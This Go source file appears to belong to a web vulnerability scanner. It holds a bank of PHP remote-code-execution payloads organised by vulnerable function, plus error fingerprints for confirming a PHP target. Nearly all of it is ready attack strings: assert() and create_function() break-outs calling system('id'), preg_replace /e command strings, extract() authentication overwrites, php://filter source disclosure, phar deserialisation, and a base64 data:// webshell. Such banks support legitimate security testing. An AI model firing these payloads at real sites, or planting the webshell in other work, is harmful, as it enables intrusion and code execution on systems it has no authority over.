// Package phpinject provides PHP user-controlled-sink payloads — the
// PHP-specific dangerous functions that turn a tainted parameter into RCE
// when the application passes user input directly without filtering.
//
// Distinct from the generic code-injection bank because the sinks have
// PHP-only semantics (preg_replace's `/e` modifier, extract() overwriting
// the symbol table, assert() evaluating its string argument, include()
// honouring wrappers like php://input and data://text/plain;base64,).
//
// Mirrors AWVS PHP_User_Controlled_Vulns.script + Unsafe_preg_replace.script.
//
// References: RIPS, PortSwigger PHP exploitation, Sam Thomas filter-chain
// research (synacktiv 2022), HackTricks PHP RCE chapter.
package phpinject

// Sink identifies the PHP function the payload exploits.
type Sink string

const (
	SinkExtract        Sink = "extract"
	SinkAssert         Sink = "assert"
	SinkPregReplace    Sink = "preg_replace"      // /e modifier (PHP < 7)
	SinkCallUserFunc   Sink = "call_user_func"
	SinkCreateFunction Sink = "create_function"   // removed in PHP 8
	SinkInclude        Sink = "include"           // include/include_once/require/require_once
	SinkUnsafeUnser    Sink = "unserialize"
	SinkObjectInst     Sink = "object_instantiation"
)

// Payload represents a PHP-sink payload.
type Payload struct {
	Value       string
	Sink        Sink
	Description string
	MinPHP      string // minimum PHP version where this works ("" = any)
	MaxPHP      string // maximum PHP version where this works ("" = any)
}

// GetPayloads returns all PHP-sink payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetBySink returns payloads targeting a specific PHP sink.
func GetBySink(sink Sink) []Payload {
	var out []Payload
	for _, p := range payloads {
		if p.Sink == sink {
			out = append(out, p)
		}
	}
	return out
}

// GetErrorPatterns returns PHP error fingerprints — useful for confirming
// the response originates from a PHP runtime before firing exploit payloads.
func GetErrorPatterns() []string {
	return errorPatterns
}

var payloads = []Payload{
	// --- extract($_GET) lets attacker set arbitrary local variables ---
	{
		Value:       `auth_ok=1&is_admin=1`,
		Sink:        SinkExtract,
		Description: "extract($_GET) overwrite-auth body (sets $auth_ok, $is_admin in caller scope)",
	},
	{
		Value:       `db_password=&db_user=admin`,
		Sink:        SinkExtract,
		Description: "extract() overwrite DB-credential locals",
	},

	// --- assert() evaluates its string argument as PHP code (PHP < 8) ---
	{
		Value:       `'); system('id'); //`,
		Sink:        SinkAssert,
		MaxPHP:      "7.4",
		Description: "assert($_GET[x]) string-eval RCE",
	},
	{
		Value:       `1) || phpinfo() || (1`,
		Sink:        SinkAssert,
		MaxPHP:      "7.4",
		Description: "assert() boolean-chain phpinfo RCE",
	},

	// --- preg_replace with /e modifier evaluates replacement as PHP (PHP < 7) ---
	{
		Value:       `/.*/e`,
		Sink:        SinkPregReplace,
		MaxPHP:      "5.6",
		Description: "preg_replace pattern with /e modifier (replacement now eval'd)",
	},
	{
		Value:       `/.+/e`,
		Sink:        SinkPregReplace,
		MaxPHP:      "5.6",
		Description: "preg_replace /e variant",
	},
	{
		Value:       `system('id')`,
		Sink:        SinkPregReplace,
		MaxPHP:      "5.6",
		Description: "preg_replace /e replacement value (RCE)",
	},
	{
		Value:       `exec('id')`,
		Sink:        SinkPregReplace,
		MaxPHP:      "5.6",
		Description: "preg_replace /e replacement → exec()",
	},
	{
		Value:       `passthru('id')`,
		Sink:        SinkPregReplace,
		MaxPHP:      "5.6",
		Description: "preg_replace /e replacement → passthru()",
	},
	{
		Value:       `phpinfo()`,
		Sink:        SinkPregReplace,
		MaxPHP:      "5.6",
		Description: "preg_replace /e replacement → phpinfo()",
	},

	// --- call_user_func / call_user_func_array with user-controlled callable ---
	{
		Value:       `system`,
		Sink:        SinkCallUserFunc,
		Description: "call_user_func('system', $_GET[cmd]) → arbitrary command",
	},
	{
		Value:       `exec`,
		Sink:        SinkCallUserFunc,
		Description: "call_user_func('exec', $_GET[cmd])",
	},
	{
		Value:       `passthru`,
		Sink:        SinkCallUserFunc,
		Description: "call_user_func('passthru', $_GET[cmd])",
	},
	{
		Value:       `assert`,
		Sink:        SinkCallUserFunc,
		MaxPHP:      "7.4",
		Description: "call_user_func('assert', $_GET[code])",
	},

	// --- create_function() — removed in PHP 8 ---
	{
		Value:       `}system('id');//`,
		Sink:        SinkCreateFunction,
		MaxPHP:      "7.4",
		Description: "create_function() body break-out RCE (legacy < PHP 8)",
	},

	// --- include() with stream wrappers ---
	{
		Value:       `php://input`,
		Sink:        SinkInclude,
		Description: "include('php://input') reads request body as PHP (Content-Type body = <?php …)",
	},
	{
		Value:       `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`,
		Sink:        SinkInclude,
		Description: "include('data://text/plain;base64,…') inline PHP exec",
	},
	{
		Value:       `php://filter/convert.base64-encode/resource=index.php`,
		Sink:        SinkInclude,
		Description: "include() leak via php://filter base64 (no eval, source disclosure)",
	},
	{
		Value:       `expect://id`,
		Sink:        SinkInclude,
		Description: "include('expect://id') if expect:// wrapper loaded (RCE)",
	},
	{
		Value:       `phar://uploaded.phar/test.txt`,
		Sink:        SinkInclude,
		Description: "include('phar://…') metadata-deserialise → POP gadget RCE",
	},

	// --- unserialize() with attacker-controlled string ---
	{
		Value:       `O:8:"stdClass":0:{}`,
		Sink:        SinkUnsafeUnser,
		Description: "unserialize($_GET[x]) basic stdClass — fingerprint hit",
	},

	// --- new $_GET[class]($_GET[arg]) — dynamic object instantiation ---
	{
		Value:       `SoapClient`,
		Sink:        SinkObjectInst,
		Description: "Dynamic class instantiation → SoapClient SSRF/XXE",
	},
	{
		Value:       `SimpleXMLElement`,
		Sink:        SinkObjectInst,
		Description: "Dynamic class instantiation → SimpleXMLElement XXE",
	},
}

var errorPatterns = []string{
	"PHP Fatal error: ",
	"PHP Parse error: ",
	"PHP Warning: ",
	"PHP Notice: ",
	"PHP Stack trace:",
	"PHP Warning: call_user_func() expects",
	"PHP Deprecated: preg_replace(): The /e modifier is deprecated",
	"PHP Deprecated: assert(): Calling assert() with a string argument is deprecated",
	"PHP Warning: unserialize(): Error at offset",
	"PHP Deprecated:",
}
